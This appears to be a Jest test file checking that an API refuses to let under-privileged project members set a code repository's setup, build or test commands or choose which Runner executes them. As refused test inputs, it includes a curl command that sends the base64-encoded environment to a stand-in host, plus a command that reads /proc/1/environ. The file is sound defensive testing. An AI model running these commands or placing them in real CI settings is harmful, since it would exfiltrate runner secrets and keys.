jest.mock("../../../Server/Utils/Logger", () => {
  return {
    __esModule: true,
    default: {
      debug: jest.fn(),
      info: jest.fn(),
      warn: jest.fn(),
      error: jest.fn(),
      getLogLevel: jest.fn().mockReturnValue("INFO"),
    },
    getLogAttributesFromRequest: jest.fn().mockReturnValue({}),
  };
});

import BaseAPI from "../../../Server/API/BaseAPI";
import CommonAPI from "../../../Server/API/CommonAPI";
import CodeRepositoryService from "../../../Server/Services/CodeRepositoryService";
import DatabaseService from "../../../Server/Services/DatabaseService";
import RunnerService from "../../../Server/Services/RunnerService";
import CodeRepository from "../../../Models/DatabaseModels/CodeRepository";
import BaseModel from "../../../Models/DatabaseModels/DatabaseBaseModel/DatabaseBaseModel";
import DatabaseCommonInteractionProps from "../../../Types/BaseDatabase/DatabaseCommonInteractionProps";
import { getRunnerWorkRefusal } from "../../../Types/CodeRepository/CodeRepositoryRunnerAuthoring";
import CodeRepositoryType from "../../../Types/CodeRepository/CodeRepositoryType";
import { JSONObject } from "../../../Types/JSON";
import ObjectID from "../../../Types/ObjectID";
import Permission from "../../../Types/Permission";
import { customDomainCaller } from "./CustomDomainCallers";
import DashboardRequestsOverHttp, {
  SentRequest,
} from "../TestingUtils/DashboardRequestsOverHttp";
import {
  InMemoryTable,
  useInMemoryTable,
} from "../TestingUtils/InMemoryRepository";
import { stubProjectDirectory } from "../TestingUtils/ProjectDirectory";
import { ON_HIGHEST_PLAN } from "../TestingUtils/RequestPlan";
import { getJestSpyOn } from "../../Spy";
import {
  afterAll,
  afterEach,
  beforeAll,
  beforeEach,
  describe,
  expect,
  jest,
  test,
} from "@jest/globals";

/*
 * WHO DECIDES WHAT A PROJECT'S RUNNER RUNS FOR A CODE REPOSITORY, THROUGH
 * THE API.
 *
 * The report: a Project Member - or a Settings Admin or Member, or Edit
 * Code Repository - sets a repository's setup command through the API,
 * points the repository at one of the project's Runners and asks AI to work
 * in it. The Runner runs the command, with its own environment, its key
 * included: the member takes the key and claims the Runner's jobs, with
 * every secret sent with them.
 *
 * Through Express, BaseAPI, the permission layer, CodeRepositoryService's
 * hooks and tables in memory:
 *
 *   - a create that sets a command or picks a Runner is refused, from a
 *     person or an API key, saying what, why and who may, and nothing is
 *     written;
 *   - an update that sets a command or picks a Runner is refused, and the
 *     repository is left as it was;
 *   - a Runbook Admin, Edit Runbook with the repository's own permissions,
 *     and a Project Admin set them as before;
 *   - a Project Member still connects a repository with no command and no
 *     Runner of its own, and still changes its other settings.
 */

const PROJECT_ID: ObjectID = new ObjectID(
  "1f5f0000-0000-4000-8000-000000000004",
);
const REPOSITORY_ID: string = "1f5f0000-0000-4000-8000-0000000000a2";
const CI_RUNNER_ID: string = "1f5f0000-0000-4000-8000-0000000000b3";
const PROD_RUNNER_ID: string = "1f5f0000-0000-4000-8000-0000000000b4";

const HOSTILE_COMMAND: string =
  'curl -s https://collector.example/c -d "$(env | base64 -w0)"';

const WRITERS_TITLES: Array<string> = [
  "Project Owner",
  "Project Admin",
  "Edit Runbook",
  "Runbook Admin",
];

function caller(
  permissions: Array<Permission>,
  isApiKey: boolean = false,
): DatabaseCommonInteractionProps {
  return {
    ...customDomainCaller({
      permissions: permissions,
      projectId: PROJECT_ID,
      isApiKey: isApiKey,
    }),
    ...ON_HIGHEST_PLAN,
  };
}

let server: DashboardRequestsOverHttp;
let repositories: InMemoryTable;
let props: DatabaseCommonInteractionProps;

async function create(data: JSONObject): Promise<SentRequest> {
  return await server.request("POST", "/api/code-repository", {
    data: {
      name: "checkout-service",
      projectId: PROJECT_ID.toString(),
      repositoryHostedAt: CodeRepositoryType.GitHub,
      organizationName: "acme",
      repositoryName: "checkout-service",
      ...data,
    },
  });
}

async function update(data: JSONObject): Promise<SentRequest> {
  return await server.request("PUT", `/api/code-repository/${REPOSITORY_ID}`, {
    data: data,
  });
}

// The words of a refusal, as the server answers them.
function refusalOf(sent: SentRequest): string {
  const answer: JSONObject = (sent.answer || {}) as JSONObject;
  return String(answer["error"] || answer["message"] || "");
}

function repository(): Record<string, unknown> {
  return repositories.get(REPOSITORY_ID) as Record<string, unknown>;
}

beforeAll(async () => {
  server = new DashboardRequestsOverHttp();
  await server.start([
    new BaseAPI<CodeRepository, DatabaseService<BaseModel>>(
      CodeRepository,
      CodeRepositoryService as unknown as DatabaseService<BaseModel>,
    ).getRouter(),
  ]);
});

afterAll(async () => {
  await server.stop();
});

beforeEach(() => {
  server.requests.length = 0;
  stubProjectDirectory({});

  jest
    .spyOn(CommonAPI, "getDatabaseCommonInteractionProps")
    .mockImplementation(async (): Promise<DatabaseCommonInteractionProps> => {
      return { ...props };
    });

  getJestSpyOn(CodeRepositoryService, "onTriggerRealtime").mockResolvedValue(
    undefined as never,
  );

  repositories = useInMemoryTable(CodeRepositoryService, [
    {
      _id: REPOSITORY_ID,
      projectId: PROJECT_ID.toString(),
      name: "payments-api",
      slug: "payments-api",
      repositoryHostedAt: CodeRepositoryType.GitHub,
      organizationName: "acme",
      repositoryName: "payments-api",
      mainBranchName: "main",
      setupCommand: "npm ci",
      buildCommand: null,
      testCommand: "npm test",
      runnerId: CI_RUNNER_ID,
      version: 1,
    },
  ]);

  useInMemoryTable(RunnerService, [
    {
      _id: CI_RUNNER_ID,
      projectId: PROJECT_ID.toString(),
      name: "ci-runner",
      key: "1f5f0000-0000-4000-8000-0000000000c3",
      canRunRunbooks: true,
      isGlobalRunner: false,
      isProjectDefault: false,
    },
    {
      _id: PROD_RUNNER_ID,
      projectId: PROJECT_ID.toString(),
      name: "prod-eu-west-1",
      key: "1f5f0000-0000-4000-8000-0000000000c4",
      canRunRunbooks: true,
      isGlobalRunner: false,
      isProjectDefault: false,
    },
  ]);
});

afterEach(() => {
  jest.restoreAllMocks();
});

describe("POST /api/code-repository that sets a command or picks a Runner", () => {
  test.each([
    ["a Project Member", caller([Permission.ProjectMember])],
    ["a Project Member's API key", caller([Permission.ProjectMember], true)],
    ["a Settings Admin", caller([Permission.SettingsAdmin])],
    ["a Settings Member", caller([Permission.SettingsMember])],
    [
      "Create Code Repository",
      caller([Permission.CreateCodeRepository, Permission.ReadCodeRepository]),
    ],
    ["a Code Admin", caller([Permission.CodeAdmin])],
  ])(
    "from %s, with the report's setup command, is refused and nothing is written",
    async (_who: string, as: DatabaseCommonInteractionProps) => {
      props = as;

      const sent: SentRequest = await create({
        setupCommand: HOSTILE_COMMAND,
      });

      expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
        status: 422,
        refusal: getRunnerWorkRefusal({
          setsCommand: true,
          picksRunner: false,
          permissionTitles: WRITERS_TITLES,
        }),
      });
      expect(repositories.inserts).toEqual([]);
    },
  );

  test("from a Project Member, pointing it at the production Runner, is refused and nothing is written", async () => {
    props = caller([Permission.ProjectMember]);

    const sent: SentRequest = await create({ runnerId: PROD_RUNNER_ID });

    expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
      status: 422,
      refusal: getRunnerWorkRefusal({
        setsCommand: false,
        picksRunner: true,
        permissionTitles: WRITERS_TITLES,
      }),
    });
    expect(repositories.inserts).toEqual([]);
  });

  test("from a Project Member, with both, is refused naming both", async () => {
    props = caller([Permission.ProjectMember]);

    const sent: SentRequest = await create({
      buildCommand: HOSTILE_COMMAND,
      runnerId: PROD_RUNNER_ID,
    });

    expect(sent.status).toBe(422);
    expect(refusalOf(sent)).toBe(
      getRunnerWorkRefusal({
        setsCommand: true,
        picksRunner: true,
        permissionTitles: WRITERS_TITLES,
      }),
    );
    expect(repositories.inserts).toEqual([]);
  });

  test.each([
    [
      "a Runbook Admin who may connect repositories",
      caller([
        Permission.RunbookAdmin,
        Permission.CreateCodeRepository,
        Permission.ReadCodeRepository,
      ]),
    ],
    [
      "a Runbook Admin's API key",
      caller(
        [
          Permission.RunbookAdmin,
          Permission.CreateCodeRepository,
          Permission.ReadCodeRepository,
        ],
        true,
      ),
    ],
    [
      "Edit Runbook with Create Code Repository",
      caller([
        Permission.EditRunbook,
        Permission.CreateCodeRepository,
        Permission.ReadCodeRepository,
      ]),
    ],
    ["a Project Admin", caller([Permission.ProjectAdmin])],
  ])(
    "from %s is created with its commands and its Runner as sent",
    async (_who: string, as: DatabaseCommonInteractionProps) => {
      props = as;

      const sent: SentRequest = await create({
        setupCommand: "npm ci",
        testCommand: "npm test",
        runnerId: PROD_RUNNER_ID,
      });

      expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
        status: 200,
        refusal: "",
      });
      expect(repositories.inserts).toHaveLength(1);
      expect(repositories.inserts[0]).toMatchObject({
        setupCommand: "npm ci",
        testCommand: "npm test",
      });
      expect(String(repositories.inserts[0]!["runnerId"]).toLowerCase()).toBe(
        PROD_RUNNER_ID,
      );
    },
  );
});

describe("POST /api/code-repository from a Project Member, with nothing that runs", () => {
  test.each([
    ["no command and no Runner", {}],
    [
      "every command empty and no Runner",
      {
        setupCommand: null,
        buildCommand: "",
        testCommand: " ",
        runnerId: null,
      },
    ],
    ["the Global Runner, picked", { isGlobalRunnerPicked: true }],
  ])("is created with %s", async (_what: string, data: JSONObject) => {
    props = caller([Permission.ProjectMember]);

    const sent: SentRequest = await create(data);

    expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
      status: 200,
      refusal: "",
    });
    expect(repositories.inserts).toHaveLength(1);
  });
});

describe("PUT /api/code-repository/:id that changes what a Runner runs", () => {
  test.each([
    ["a Project Member", caller([Permission.ProjectMember])],
    ["a Project Member's API key", caller([Permission.ProjectMember], true)],
    ["a Settings Admin", caller([Permission.SettingsAdmin])],
    [
      "Edit Code Repository",
      caller([Permission.EditCodeRepository, Permission.ReadCodeRepository]),
    ],
    ["a Code Admin", caller([Permission.CodeAdmin])],
  ])(
    "from %s is refused, and the repository is as it was",
    async (_who: string, as: DatabaseCommonInteractionProps) => {
      props = as;

      for (const data of [
        { setupCommand: HOSTILE_COMMAND },
        { testCommand: "sh -c 'cat /proc/1/environ'" },
        { runnerId: PROD_RUNNER_ID },
        { isGlobalRunnerPicked: true },
        { setupCommand: null },
      ]) {
        const sent: SentRequest = await update(data);

        expect({ data, refused: sent.status >= 400 }).toEqual({
          data,
          refused: true,
        });
        expect(refusalOf(sent)).toContain("You need one of these permissions");
        expect(refusalOf(sent)).toContain("Project Owner, Project Admin");
      }

      expect(repository()).toMatchObject({
        setupCommand: "npm ci",
        buildCommand: null,
        testCommand: "npm test",
        runnerId: CI_RUNNER_ID,
      });
      expect(repositories.updates).toEqual([]);
    },
  );

  test.each([
    [
      "Edit Runbook with Edit Code Repository",
      caller([
        Permission.EditRunbook,
        Permission.EditCodeRepository,
        Permission.ReadCodeRepository,
      ]),
    ],
    [
      "a Runbook Admin who is a Project Member",
      caller([Permission.RunbookAdmin, Permission.ProjectMember]),
    ],
    ["a Project Admin", caller([Permission.ProjectAdmin])],
  ])(
    "from %s changes them",
    async (_who: string, as: DatabaseCommonInteractionProps) => {
      props = as;

      const sent: SentRequest = await update({
        testCommand: "npm run test:ci",
        runnerId: PROD_RUNNER_ID,
      });

      expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
        status: 200,
        refusal: "",
      });
      expect(repository()["testCommand"]).toBe("npm run test:ci");
      expect(String(repository()["runnerId"]).toLowerCase()).toBe(
        PROD_RUNNER_ID,
      );
    },
  );

  test("Remove Commands, from someone who may: all three are cleared", async () => {
    props = caller([Permission.ProjectAdmin]);

    const sent: SentRequest = await update({
      setupCommand: null,
      buildCommand: null,
      testCommand: null,
    });

    expect(sent.status).toBe(200);
    expect(repository()).toMatchObject({
      setupCommand: null,
      buildCommand: null,
      testCommand: null,
    });
  });
});

describe("PUT /api/code-repository/:id from a Project Member, of its other settings", () => {
  test("still changes them, and leaves what a Runner runs alone", async () => {
    props = caller([Permission.ProjectMember]);

    const sent: SentRequest = await update({
      description: "Checkout and payments",
      mainBranchName: "trunk",
    });

    expect({ status: sent.status, refusal: refusalOf(sent) }).toEqual({
      status: 200,
      refusal: "",
    });
    expect(repository()).toMatchObject({
      description: "Checkout and payments",
      mainBranchName: "trunk",
      setupCommand: "npm ci",
      testCommand: "npm test",
    });
  });
});
